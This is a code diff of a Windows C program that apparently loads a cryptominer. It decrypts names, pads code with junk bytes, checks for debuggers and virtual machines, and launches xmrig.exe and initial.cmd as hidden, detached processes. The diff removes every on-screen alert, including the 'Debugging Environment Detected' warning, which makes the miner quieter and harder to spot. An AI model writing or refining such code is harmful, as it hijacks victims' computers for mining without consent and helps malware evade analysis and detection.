@@ -1,5 +1,3 @@
-// ===== BiG BuG TBuG =====
-
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
@@ -18,7 +16,7 @@ BYTE encryptedInitial[] = {
 
 #if defined(__GNUC__) && (defined(__x86_64__) || defined(__i386__))
     #define JUNK_BLOCK __asm__ __volatile__ (".byte 0x90, 0x90")
-#elif defined(_MSC_VER) && defined(_M_IX86) 
+#elif defined(_MSC_VER) && defined(_M_IX86)  
     #define JUNK_BLOCK __asm { __emit 0x90; __emit 0x90 }
 #else
     #define JUNK_BLOCK
@@ -41,6 +39,7 @@ BOOL FileExists(LPCSTR path) {
     return (attrib != INVALID_FILE_ATTRIBUTES && 
             !(attrib & FILE_ATTRIBUTE_DIRECTORY));
 }
+
 
 BOOL IsVM() {
     
@@ -115,6 +114,7 @@ BOOL IsVM() {
     #endif
 
     return result;
+    
 }
 
 BOOL IsAdmin() {
@@ -170,7 +170,7 @@ BOOL RunHiddenProcess(LPCSTR command) {
         FALSE,             
         CREATE_NO_WINDOW | DETACHED_PROCESS,
         NULL,              
-        NULL,  
+        NULL,              
         &si,               
         &pi                
     );
@@ -200,8 +200,7 @@ int main() {
         }
     }
     
-    if(IsDebugged()  || IsVM() ) {
-        MessageBoxA(NULL, "Debugging Environment Detected", "Security Alert", MB_ICONERROR);
+    if(IsDebugged() || IsVM() ) {
         return 1;
     }
 
@@ -222,18 +221,16 @@ int main() {
     snprintf(fullApp1, sizeof(fullApp1), "%s\\%s", currentDir, encryptedApp1);
     
     if(FileExists(fullApp1)) {
-        if(RunHiddenProcess(encryptedApp1)) {  
+        if(RunHiddenProcess(encryptedApp1)) { 
             app1Success = TRUE;
         } else {
             DWORD err = GetLastError();
             CHAR errorMsg[256];
             snprintf(errorMsg, sizeof(errorMsg), "Failed to run xmrig.exe\nError: %lu", err);
-            MessageBoxA(NULL, errorMsg, "Execution Error", MB_ICONWARNING);
         }
     } else {
         CHAR notFoundMsg[256];
         snprintf(notFoundMsg, sizeof(notFoundMsg), "xmrig.exe not found in:\n%s", currentDir);
-        MessageBoxA(NULL, notFoundMsg, "File Missing", MB_ICONWARNING);
     }
 
     BOOL initialSuccess = FALSE;
@@ -247,16 +244,13 @@ int main() {
             DWORD err = GetLastError();
             CHAR errorMsg[256];
             snprintf(errorMsg, sizeof(errorMsg), "Failed to run initial.cmd\nError: %lu", err);
-            MessageBoxA(NULL, errorMsg, "Execution Error", MB_ICONWARNING);
         }
     } else {
         CHAR notFoundMsg[256];
         snprintf(notFoundMsg, sizeof(notFoundMsg), "initial.cmd not found in:\n%s", currentDir);
-        MessageBoxA(NULL, notFoundMsg, "File Missing", MB_ICONWARNING);
     }
 
     if(!app1Success && !initialSuccess) {
-        MessageBoxA(NULL, "All operations failed", "Critical Error", MB_ICONERROR);
         return 1;
     }
 
